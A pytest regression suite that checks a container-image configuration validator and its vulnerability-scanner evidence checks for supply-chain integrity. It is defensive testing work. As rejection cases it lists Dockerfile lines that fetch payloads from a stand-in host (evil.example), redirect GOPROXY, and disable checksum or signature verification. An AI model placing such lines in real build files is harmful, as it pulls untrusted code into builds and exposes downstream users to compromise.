"""Regression cases from all three PR #8 reviews."""

import copy
import hashlib
import json
from pathlib import Path
from typing import Any

import pytest

from scripts import images
from tests.gates.test_images import configured as configured


@pytest.mark.req("NFR-024", kind="configuration check", part="source-rejection")
@pytest.mark.parametrize(
    "recipe,line",
    [
        ("api", "# syntax=docker.io/evil/frontend:latest"),
        ("api", "RUN --mount=type=bind,from=evil/image:latest,target=/x true"),
        ("api", "ADD https://evil.example/payload /payload"),
        ("api", "ONBUILD COPY --from=evil/image:latest /x /x"),
        ("api", "COPY \\\n --from=evil/image:latest /x /x"),
        ("go", "ENV GOPROXY=https://evil.example GOSUMDB=off GOTOOLCHAIN=auto"),
        ("go", "ENV GOPROXY=https://proxy.golang.org.evil.example"),
        ("caddy", "ENV GOTOOLCHAIN=auto"),
        ("postgres", "ENV GOSUMDB=off"),
        ("caddy", "RUN GOPROXY=https://evil.example go mod download"),
        ("go", "ENV GONOSUMDB=*"),
        ("go", "RUN go env -w GOPROXY=https://evil.example"),
        ("go", "RUN sh -c 'curl https://evil.example/payload'"),
        ("go", "RUN go get evil.example/module@latest"),
        ("go", "RUN apk upgrade --no-cache --allow-untrusted"),
    ],
)
def test_source_construct_bypasses_fail(
    configured: Path, recipe: str, line: str
) -> None:
    p = configured / f"docker/{recipe}/Dockerfile"
    p.write_text(p.read_text() + "\n" + line + "\n")
    with pytest.raises(ValueError):
        images.check_configuration(configured)


@pytest.mark.req("NFR-024", kind="configuration check", part="source-rejection")
@pytest.mark.parametrize(
    "line",
    ["toolchain\tgo1.99.0", "replace\tgolang.org/x/net => evil.example/net v1.0.0"],
)
def test_go_alternate_whitespace_fails(configured: Path, line: str) -> None:
    p = configured / "docker/caddy/go.mod"
    p.write_text(p.read_text() + "\n" + line + "\n")
    with pytest.raises(ValueError):
        images.check_configuration(configured)


@pytest.mark.req("NFR-024", kind="configuration check", part="source-rejection")
@pytest.mark.parametrize(
    "path", ["Dockerfile", "docker/api/Dockerfile.foo", "compose.yaml"]
)
def test_unhandled_build_configuration_fails(configured: Path, path: str) -> None:
    (configured / path).write_text("FROM evil/image:latest\n")
    with pytest.raises(ValueError):
        images.check_configuration(configured)


@pytest.mark.req("NFR-026", kind="configuration check", part="scanner-policy-rejection")
@pytest.mark.parametrize("tool", ["trivy", "grype"])
@pytest.mark.parametrize("mutation", ["missing", "ignore", "cataloging"])
def test_scanner_policy_changes_fail(
    configured: Path, tool: str, mutation: str
) -> None:
    p = configured / f"docker/{tool}.yaml"
    if mutation == "missing":
        p.unlink(missing_ok=True)
    else:
        p.write_text(
            (p.read_text() if p.exists() else "")
            + (
                "\nignore-policy: /tmp/ignore.rego\n"
                if mutation == "ignore"
                else "\npkg:\n  types: [os]\n"
            )
        )
    with pytest.raises(ValueError):
        images.check_configuration(configured)


def grype_report() -> tuple[dict[str, Any], dict[str, Any]]:
    identity: dict[str, Any] = {
        "Id": "sha256:" + "a" * 64,
        "Architecture": "amd64",
        "Os": "linux",
        "RootFS": {"Layers": ["sha256:" + "b" * 64]},
    }
    report: dict[str, Any] = {
        "source": {
            "type": "image",
            "target": {
                "architecture": "amd64",
                "os": "linux",
                "imageID": identity["Id"],
                "layers": [{"digest": identity["RootFS"]["Layers"][0]}],
            },
        },
        "matches": [],
        "ignoredMatches": [],
    }
    return identity, report


@pytest.mark.req("NFR-026", kind="configuration check", part="scanner-policy-rejection")
@pytest.mark.parametrize("state", ["fixed", "unknown", "", "future-state"])
@pytest.mark.parametrize("severity", ["High", "Critical"])
def test_grype_fix_states_fail_closed(state: str, severity: str) -> None:
    identity, report = grype_report()
    report["matches"] = [
        {
            "artifact": {"name": "python", "version": "3.13.0"},
            "vulnerability": {"severity": severity, "fix": {"state": state}},
        }
    ]
    with pytest.raises(images.VulnerableImage):
        images.check_grype(report, identity, 0)


@pytest.mark.parametrize("state", ["not-fixed", "wont-fix"])
@pytest.mark.req("NFR-026", kind="configuration check", part="build-scans")
def test_grype_approved_unfixed_states_retained(state: str) -> None:
    identity, report = grype_report()
    report["matches"] = [
        {"vulnerability": {"severity": "High", "fix": {"state": state}}}
    ]
    images.check_grype(report, identity, 0)


@pytest.mark.req("NFR-026", kind="configuration check", part="scanner-policy-rejection")
@pytest.mark.parametrize(
    "mutation", ["ignored", "layers", "architecture", "status", "missing-matches"]
)
def test_grype_execution_association_and_suppression_fail(mutation: str) -> None:
    identity, report = grype_report()
    if mutation == "ignored":
        report["ignoredMatches"] = [{"vulnerability": {"severity": "High"}}]
    if mutation == "layers":
        report["source"]["target"]["layers"] = []
    if mutation == "architecture":
        report["source"]["target"]["architecture"] = "arm64"
    if mutation == "missing-matches":
        del report["matches"]
    with pytest.raises(ValueError):
        images.check_grype(report, identity, 1 if mutation == "status" else 0)


@pytest.mark.req("NFR-024", kind="configuration check", part="coverage-rejection")
@pytest.mark.parametrize(
    "mutation", ["missing", "extra", "unscanned", "sbom", "association"]
)
def test_effective_coverage_rejected_at_pipeline_boundary(
    mutation: str, tmp_path: Path
) -> None:
    # Expected roles come from recipes and service pins, not reported evidence.
    item = {
        "image_id": "sha256:" + "a" * 64,
        "reference": "test",
        "scan": "t.json",
        "grype_scan": "g.json",
        "sbom": "bom.json",
        "installed": {"os": {"libc": "1"}},
        "scanner_status": 0,
        "grype_status": 0,
    }
    evidence: dict[str, Any] = {
        "effective": {k: copy.deepcopy(item) for k in images.expected_effective()},
        "builds": {},
    }
    if mutation == "missing":
        evidence["effective"].pop("python")
    elif mutation == "extra":
        evidence["effective"]["surprise"] = item
    elif mutation == "unscanned":
        del evidence["effective"]["python"]["grype_scan"]
    elif mutation == "sbom":
        del evidence["effective"]["python"]["sbom"]
    else:
        evidence["effective"]["python"]["image_id"] = "wrong"
    with pytest.raises((ValueError, OSError, KeyError)):
        images.check_effective_coverage(tmp_path, evidence)


@pytest.mark.req("NFR-026", kind="configuration check", part="scanner-policy-rejection")
def test_cached_build_client_is_verified_before_execution(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:

    asset = "buildx-test"
    data = b"verified executable fixture"
    key = "darwin-arm64"
    monkeypatch.setattr(images.sys, "platform", "darwin")
    monkeypatch.setattr(images.platform, "machine", lambda: "arm64")
    monkeypatch.setitem(
        images.TOOL_PINS, "buildx", {key: (asset, hashlib.sha256(data).hexdigest())}
    )
    cache = tmp_path / ".cache/tools"
    cache.mkdir(parents=True)
    binary = cache / asset
    binary.write_bytes(data)
    assert images.verified_tool("buildx", tmp_path) == binary
    binary.write_bytes(b"poisoned cached executable")
    with pytest.raises(ValueError, match="integrity"):
        images.verified_tool("buildx", tmp_path)


@pytest.mark.req("NFR-024", kind="configuration check", part="inventory-rejection")
@pytest.mark.parametrize(
    "mutation", ["missing-principal", "version", "image", "missing-version"]
)
def test_grype_inventory_rejection(tmp_path: Path, mutation: str) -> None:
    identity = "sha256:" + "a" * 64
    bom: dict[str, Any] = {
        "bomFormat": "CycloneDX",
        "specVersion": "1.7",
        "version": 1,
        "metadata": {"component": {"version": "a" * 64}},
        "components": [{"type": "application", "name": "python", "version": "3.13.18"}],
    }
    if mutation == "missing-principal":
        bom["components"] = [{"type": "library", "name": "libc", "version": "1"}]
    if mutation == "version":
        bom["components"][0]["version"] = "3.13.0"
    if mutation == "missing-version":
        del bom["components"][0]["version"]
    if mutation == "image":
        bom["metadata"]["component"]["version"] = "b" * 64
    path = tmp_path / "b.json"
    path.write_text(json.dumps(bom))
    with pytest.raises(ValueError):
        packages = images.check_grype_sbom(path, identity)
        images.check_installed(packages, {"principal": {"python": "3.13.18"}})


@pytest.mark.req("NFR-026", kind="configuration check", part="build-scans")
def test_caddy_keeps_upstream_permitted_only_file_capability() -> None:
    recipe = (images.ROOT / "docker/caddy/Dockerfile").read_text()
    assert "setcap cap_net_bind_service=+p /usr/bin/caddy" in recipe
    assert "--chown=1001:1001" in recipe


@pytest.mark.req("NFR-024", kind="configuration check", part="coverage-rejection")
def test_correct_scan_cannot_be_assigned_to_another_effective_role(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    def no_effective_check(root: Path, item: dict[str, Any]) -> None:
        pass

    def inventory(path: Path, identity: str) -> set[tuple[str, str]]:
        return {("libc", "1")}

    def roles(root: Path = images.ROOT) -> set[str]:
        return {"python"}

    monkeypatch.setattr(images, "expected_effective", roles)
    monkeypatch.setattr(images, "require_effective", no_effective_check)
    monkeypatch.setattr(images, "check_sbom", inventory)
    monkeypatch.setattr(images, "check_grype_sbom", inventory)
    evidence: dict[str, Any] = {
        "effective": {
            "python": {
                "image_id": "redis-image",
                "sbom": "bom",
                "trivy_sbom": "t-bom",
                "installed": {"os": {"libc": "1"}},
            }
        },
        "builds": {
            "python": {"image_id": "python-image", "recipe": "python", "arguments": {}}
        },
        "inputs": {},
    }
    with pytest.raises(ValueError, match="association"):
        images.check_effective_coverage(tmp_path, evidence)
